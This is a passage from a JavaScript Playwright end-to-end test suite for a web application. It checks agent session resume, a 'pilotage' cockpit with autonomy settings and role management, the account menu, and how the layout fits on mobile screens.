      await page.click('#ab-detail [data-abact=send]');
      await page.waitForFunction(() => /Done: Carry on/.test(document.querySelector('#ab-detail .ab-thread')?.textContent || ''), null, { timeout: 20000 }).catch(() => {});
      const ran2 = ex(args) ? rf(args, 'utf8') : '';
      check('agent resume: the answer after resuming continues that same session', /Done: Carry on/.test(await page.textContent('#ab-detail .ab-thread'))
        && (ran2.match(new RegExp('^-p --resume ' + st.id.split(':')[1] + '$', 'gm')) || []).length === 2, ran2);
      await page.click('#ab-detail [data-abact=close]');
    } finally { lis.kill(); }
  },
  async pilotage({ page, check, root, data }) {
    // the director's cockpit: four tabs over machinery already shipped, voice-first
    // seed one non-protected role so the catalogue has a card to group, specialize and run the lifecycle on
    execFileSync('php', ['-r', "require '" + join(root, 'src/autoload.php') + "';"
      + "\\Talixio\\App::fromEnv()->skills()->save('browser-role','A role for the browser test','Do the browser thing.',['kind'=>'role']);"],
      { env: { ...process.env, TALIXIO_DATA_DIR: data, TALIXIO_STORE: join(data, 'store'), TALIXIO_PROVIDER: 'echo', TALIXIO_WEB_PASSWORD: 'pw' } });
    await go(page, 'pilotage');
    check('pilotage: the view shows', await page.isVisible('#view-pilotage'));
    check('pilotage: it is reachable from the rail', await page.isVisible('.rail a[data-view=pilotage]'));
    check('pilotage: Agents is the opening tab, with the board', await page.isVisible('.pilot-panel[data-ppanel=agents] #ab'));
    check('pilotage: there is no permanent talk-to-the-pilot card any more', !(await page.$('#view-pilotage .pilot-talk')));
    // 1.45.0: the cloud orchestrator's cockpit (pairing, Journal, Passes, its agents and status) is gone from under the board
    check('pilotage: the retired cloud orchestrator cockpit is gone', !(await page.$('#ab-legacy')) && !(await page.$('#pilot-orch-connect')) && !(await page.$('#pl-tabs')) && !(await page.$('#pilot-notify')));
    check('pilotage: the retired Status file button is gone', !(await page.$('#pilot-status-btn')) && !(await page.$('#pilot-status-dl')));
    check('pilotage: the Knowledge-base tab carries a source badge slot', (await page.$$('.ptab[data-ptab=kb] .ptab-src')).length === 1);
    // the autonomy settings live on the board
    if (await page.isHidden('#ab-auto')) await page.click('#ab-auto-btn');
    await page.waitForSelector('#pl-auto .pl-lv', { timeout: 6000 });
    check('pilotage: Autonomy lists the six levels, L6 is always the user\'s', (await page.$$('#pl-auto .pl-lv tbody tr')).length === 6 && (await page.$$('#pl-auto [data-auto-lv]')).length === 5);
    await page.check('#pa-on'); await page.selectOption('#pl-auto [data-auto-lv=L2]', 'tell'); await page.fill('#pa-pr', 'Client work first\nInternal tools later');
    await page.click('#pl-auto [data-auto-save]'); await page.waitForTimeout(700);
    const pol = await api(page, 'api/pilot');
    check('pilotage: the autonomy settings are saved on the server', pol.enabled === true && pol.levels.L2.mode === 'tell' && pol.levels.L4.mode === 'ask' && pol.priorities.join('|') === 'Client work first|Internal tools later');
    const st = await api(page, 'api/status');
    check('pilotage: the status poll no longer carries the relay\'s unread count', !('fleet_unread' in st));
    // tab switching reveals the Worksites/Chantiers board (the Director's directives)
    await page.click('#view-pilotage .ptab[data-ptab=chantiers]'); await page.waitForTimeout(400);
    check('pilotage: Worksites tab opens', await page.isVisible('.pilot-panel[data-ppanel=chantiers]'));
    await page.click('#view-pilotage .ptab[data-ptab=roles]');
    await page.waitForSelector('#pilot-roles .pnode', { timeout: 6000 });
    check('pilotage: Roles tab opens the specialization map (slice 2)', await page.isVisible('.pilot-panel[data-ppanel=roles]'));
    check('pilotage: each role is a clickable node carrying an acceptance ring',
      (await page.$$('#pilot-roles .pnode')).length >= 1
      && (await page.$$('#pilot-roles .pnode .pring')).length >= 1);
    // master → detail: a role is auto-selected, opening a detail card with its metrics and an Evaluate action
    await page.waitForSelector('#pilot-roles .prole-detail-card', { timeout: 6000 });
    check('pilotage: selecting a role opens a detail card with its ring and an Evaluate action',
      (await page.$$('#pilot-roles .prole-detail-card .pring')).length >= 1
      && (await page.$$('#pilot-roles .prole-detail-card [data-role-eval]')).length >= 1);
    check('pilotage: the assessor (role #0) is in the map, protected, so no Publish on it',
      (await page.textContent('#pilot-roles')).includes('assessor'));
    // slice 3: roles are grouped into bordered specialization cards
    check('pilotage: roles are grouped into specialization cards',
      (await page.$$('#pilot-roles .pspec-card')).length >= 1);
    // pick an editable (non-protected) role, open its detail, and use the inline specialization editor
    const editable = await page.$$eval('#pilot-roles [data-role-select]',
      els => { const b = els.find(e => e.dataset.roleSelect !== 'assessor'); return b ? b.dataset.roleSelect : null; });
    await page.click(`#pilot-roles [data-role-select="${editable}"]`);
    await page.waitForSelector('#pilot-roles .prole-detail-card form[data-role-spec]', { timeout: 6000 });
    check('pilotage: the detail card carries an inline specialization editor',
      (await page.$$('#pilot-roles .prole-detail-card form[data-role-spec]')).length >= 1);
    // slice 3: setting a specialization regroups the map under that heading
    const specForm = await page.$('#pilot-roles form[data-role-spec]');
    await specForm.$eval('.prole-spec-in', el => { el.value = 'QA'; });
    await specForm.evaluate(f => f.requestSubmit());
    await page.waitForSelector('#pilot-roles .pspec-name:text-is("QA")', { timeout: 6000 });
    check('pilotage: a saved specialization becomes a group-card header', await page.isVisible('#pilot-roles .pspec-name:text-is("QA")'));
    // slice 4: lifecycle actions on a non-protected role's detail card
    check('pilotage: a non-protected detail card carries Improve and Archive actions',
      (await page.$$('#pilot-roles .prole-detail-card [data-role-improve]')).length >= 1
      && (await page.$$('#pilot-roles .prole-detail-card [data-role-archive]')).length >= 1);
    // slice 4: Archive drops the role out of the map and into the Archived panel (history kept); Reactivate brings it back
    const archName = await page.$eval('#pilot-roles .prole-detail-card [data-role-archive]', b => b.dataset.roleArchive);
    page.once('dialog', d => d.accept());
    await page.click(`#pilot-roles [data-role-archive="${archName}"]`);
    await page.waitForSelector('#prole-arch-btn', { timeout: 6000 });
    check('pilotage: archiving drops the role out of the map',
      !(await page.$(`#pilot-roles .pnode[data-role-select="${archName}"]`)));
    await page.click('#prole-arch-btn');
    await page.waitForSelector(`#pilot-roles #prole-arch:not([hidden]) [data-role-reactivate="${archName}"]`, { timeout: 6000 });
    check('pilotage: the archived role is listed under Archived with Reactivate',
      (await page.$$(`#pilot-roles .parchived [data-role-reactivate="${archName}"]`)).length === 1);
    await page.click(`#pilot-roles [data-role-reactivate="${archName}"]`);
    await page.waitForSelector(`#pilot-roles .pnode[data-role-select="${archName}"]`, { timeout: 6000 });
    check('pilotage: Reactivate returns the role to the map', !!(await page.$(`#pilot-roles .pnode[data-role-select="${archName}"]`)));
    // slice 4: Improve opens the candidate-brief editor that feeds the Assessor's A/B
    await page.click(`#pilot-roles [data-role-select="${editable}"]`);
    await page.waitForSelector('#pilot-roles .prole-detail-card [data-role-improve]', { timeout: 6000 });
    await page.click('#pilot-roles .prole-detail-card [data-role-improve]');
    await page.waitForSelector('#prole-improve:not([hidden]) .prole-imp-in', { timeout: 6000 });
    check('pilotage: Improve opens a candidate-brief editor over the Assessor A/B', await page.isVisible('#prole-improve .prole-imp-in'));
    // "+ New role": the catalogue header opens a create form wired to role_save (same duplicate check)
    await page.click('#prole-new-btn');
    await page.waitForSelector('#prole-new:not([hidden]) .prole-new-name', { timeout: 6000 });
    check('pilotage: "+ New role" opens a create form with name, purpose, specialization and brief',
      await page.isVisible('#prole-new .prole-new-purpose') && await page.isVisible('#prole-new .prole-new-brief'));
    await page.fill('#prole-new .prole-new-name', 'meeting-notes');
    await page.fill('#prole-new .prole-new-purpose', 'summarise a meeting into decisions and actions');
    await page.fill('#prole-new .prole-new-spec', 'Veille');
    await page.fill('#prole-new .prole-new-brief', 'Summarise meetings: list decisions and actions with an owner, stay factual.');
    await page.click('#prole-new [data-new-save]');
    await page.waitForSelector('#pilot-roles .pspec-name:text-is("Veille")', { timeout: 8000 });
    check('pilotage: a created role lands in the map as a node under its specialization card',
      (await page.textContent('#pilot-roles')).includes('meeting-notes') && await page.isVisible('#pilot-roles .pspec-name:text-is("Veille")'));
    // slice 5: the KB tab is a read-only glance (counts + hub pull + a link into Library), not a one-line pointer
    await go(page, 'pilotage');
    await page.click('#view-pilotage .ptab[data-ptab=kb]');
    await page.waitForSelector('#pilot-kb .pkb .pkb-grid', { timeout: 6000 });
    check('pilotage: KB glance shows stat tiles and a link into Library',
      (await page.$$('#pilot-kb .pkb-stat')).length === 3
      && !!(await page.$('#pilot-kb .pkb-hub'))
      && !!(await page.$('#pilot-kb a[href^="#library"]')));
    // slice 5: the space switch lifted to the top of the rail shares the one builder and lists the spaces
    check('pilotage: a space switch sits at the top of the rail', await page.isVisible('#rail-space-btn'));
    await page.click('#rail-space-btn');
    await page.waitForSelector('#rail-space-menu:not([hidden]) .space-item', { timeout: 4000 });
    check('pilotage: the rail space switch opens the space menu',
      (await page.$$('#rail-space-menu .space-item[data-id]')).length >= 1);
    await page.click('#rail-space-btn'); // toggle the menu shut again (its anchor sits above the open menu)
    await page.waitForSelector('#rail-space-menu', { state: 'hidden', timeout: 4000 });
    // 1.5.0: the rail is eight entries with Pilotage last; the work surfaces that moved to the account chip
    // (Settings, Privacy, Memory, Activity) and the "⋯ More" menu (Automations, Activity) are no longer rail entries
    check('rail: Pilotage is the last rail entry', await page.$eval('.rail a:last-of-type', a => a.dataset.view) === 'pilotage');
    check('rail: the library entry is labelled Files', (await page.textContent('.rail a[data-view=library]')).includes('Files'));
    check('rail: Settings, Privacy, Memory, Activity and Automations left the rail',
      (await page.$$('.rail > a[data-view=settings], .rail > a[data-view=privacy], .rail > a[data-view=memory], .rail > a[data-view=activity], .rail > a[data-view=tasks], .rail > a[data-view=jobs]')).length === 0);
    // slice 6: Routines and Background jobs are one entry ("Automations") with [Scheduled · Background] subtabs, now in the More menu
    await page.click('#more-btn');
    await page.waitForSelector('#more-sheet:not([hidden])', { timeout: 4000 });
    check('automations: the More menu holds a single Automations entry', (await page.$$('#more-sheet a[data-view=tasks]')).length === 1
      && (await page.$$('#more-sheet a[data-view=jobs]')).length === 0);
    check('more: the desktop More menu also holds Activity', (await page.$$('#more-sheet a[data-view=activity]')).length === 1);
    await page.click('#more-sheet a[data-view=tasks]');
    await page.waitForSelector('#view-tasks:not([hidden])', { timeout: 4000 });
    check('automations: the Scheduled board shows with its subtab lit and the More entry lit',
      await page.isVisible('#view-tasks .subtabs a[data-view=tasks].active')
      && await page.isVisible('#more-btn.active'));
    await page.click('#view-tasks .subtabs a[data-view=jobs]');
    await page.waitForSelector('#view-jobs:not([hidden])', { timeout: 4000 });
    check('automations: the Background subtab switches to the jobs board, More entry still lit',
      await page.isVisible('#view-jobs .subtabs a[data-view=jobs].active')
      && await page.isVisible('#more-btn.active'));
  },
  async account({ page, check }) {
    await go(page, 'chat');
    check('account: a Claude-style account chip sits at the bottom-left of the rail', await page.isVisible('#account-btn .account-name'));
    check('account: the chip shows the signed-in identity, not a placeholder',
      (await page.textContent('#account-av')).trim() !== '?' && (await page.textContent('#account-name')).trim().length > 0);
    await page.click('#account-btn');
    await page.waitForSelector('#account-menu:not([hidden]) .space-item', { timeout: 4000 });
    const menuGeom = await page.evaluate(() => {
      const m = document.querySelector('#account-menu'), b = document.querySelector('#account-btn');
      const mr = m.getBoundingClientRect(), br = b.getBoundingClientRect();
      return { h: mr.height, w: mr.width, bottom: mr.bottom, chipTop: br.top, vh: innerHeight, left: mr.left };
    });
    check('account: the menu opens upward above the chip, fully on-screen (not crushed below it)',
      menuGeom.h > 120 && menuGeom.w > 120 && menuGeom.bottom <= menuGeom.chipTop + 1
      && menuGeom.bottom <= menuGeom.vh && menuGeom.left >= 0);
    const items = await page.textContent('#account-menu');
    check('account: the menu holds the account-level settings',
      /Settings|Réglages/.test(items) && /Usage|Utilisation/.test(items)
      && /Privacy|Confidentialité/.test(items) && /Sign out|déconnecter/.test(items));
    check('account: the Claude-only entries (plans, guest passes, API keys) are left out',
      !/forfaits|passes invités|clés d.API|API keys|guest passes/i.test(items));
    const beforeTheme = await page.getAttribute('html', 'data-theme');
    await page.click('#account-menu [data-act=theme]');
    await page.waitForSelector('#account-menu:not([hidden]) [data-act=theme]', { timeout: 2000 });
    check('account: the Theme row cycles the theme in place, menu staying open',
      (await page.getAttribute('html', 'data-theme')) !== beforeTheme);
    await page.click('#account-menu [data-sub=lang]');
    await page.waitForSelector('#account-menu [data-lang]', { timeout: 2000 });
    check('account: Language opens a sub-panel with the three choices (no reload until one is chosen)',
      (await page.$$('#account-menu [data-lang]')).length === 3);
    await page.click('#account-menu [data-back]');
    await page.waitForSelector('#account-menu [data-act=theme]', { timeout: 2000 });
    check('account: Back returns from the language sub-panel to the main menu', await page.isVisible('#account-menu [data-sub=lang]'));
    await page.click('#account-menu [data-go=privacy]');
    await page.waitForSelector('#account-menu', { state: 'hidden', timeout: 4000 });
    check('account: a menu entry navigates (Confidentialité → Privacy) and closes the menu',
      (await page.evaluate(() => location.hash)) === '#privacy');
    await page.evaluate(() => { try { saveTheme({ ...themePref(), mode: '' }); } catch {} }); // leave the theme as later flows expect
  },
  async mobile({ page, check }) {
    await page.setViewportSize({ width: 400, height: 800 });
    for (const v of ['chat', 'pilotage', 'library', 'board', 'settings']) {
      await go(page, v);
      check(`mobile: ${v} fits the screen`, await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1));
    }
    // the Pilotage tab row must keep its height on mobile (it's a flex child of the scrolling column; overflow-x:auto must not let it collapse to 0)
    await go(page, 'pilotage');
    check('mobile: the Pilotage tabs stay visible (all four, row not collapsed)',
      await page.evaluate(() => document.querySelector('.pilot-tabs').getBoundingClientRect().height > 20
        && [...document.querySelectorAll('.ptab')].every(b => b.getBoundingClientRect().height > 20))
      && (await page.$$('.pilot-tabs .ptab')).length === 4);
    await page.click('#view-pilotage .ptab[data-ptab=roles]');
    await page.waitForSelector('.pilot-panel[data-ppanel=roles]:not([hidden])', { timeout: 4000 });
    check('mobile: tapping a Pilotage tab switches panels', await page.isHidden('.pilot-panel[data-ppanel=agents]'));
    // the account chip is hidden on mobile, so the "⋯ More" menu is the only path to Settings/Privacy/Sign out — it must stay on-screen
    await go(page, 'chat');
    await page.click('#more-btn');
    await page.waitForSelector('#more-sheet:not([hidden])', { timeout: 4000 });
    const moreGeom = await page.evaluate(() => {
      const m = document.querySelector('#more-sheet'); const r = m.getBoundingClientRect();
      return { left: r.left, right: r.right, top: r.top, bottom: r.bottom, w: r.width, h: r.height, vw: innerWidth, vh: innerHeight };
    });
    check('mobile: the More menu flies up fully on-screen (not pushed off the right edge)',
      moreGeom.w > 120 && moreGeom.h > 120 && moreGeom.left >= 0 && moreGeom.right <= moreGeom.vw + 1
      && moreGeom.top >= 0 && moreGeom.bottom <= moreGeom.vh + 1);
    check('mobile: the More menu reaches the account surfaces (Settings, Privacy, Sign out)', await page.evaluate(() => {
      const t = document.querySelector('#more-sheet').textContent;
      return /Settings|Réglages/.test(t) && /Privacy|Confidentialité/.test(t) && /Sign out|déconnecter/i.test(t);
    }));
    await page.setViewportSize({ width: 1280, height: 860 });
  },
};

export default async ctx => {
  ctx.page.setDefaultTimeout(5000);
  for (const [name, f] of Object.entries(flows)) { if (process.env.ONLY && !process.env.ONLY.split(',').includes(name)) continue;
    await ctx.page.evaluate(() => document.querySelectorAll('dialog[open]').forEach(d => d.close()));
    try { await f(ctx); } catch (e) { ctx.check(`${name}: ${e.message.split('\n').slice(0, 9).join(' | ')}`, false); }
  }
};
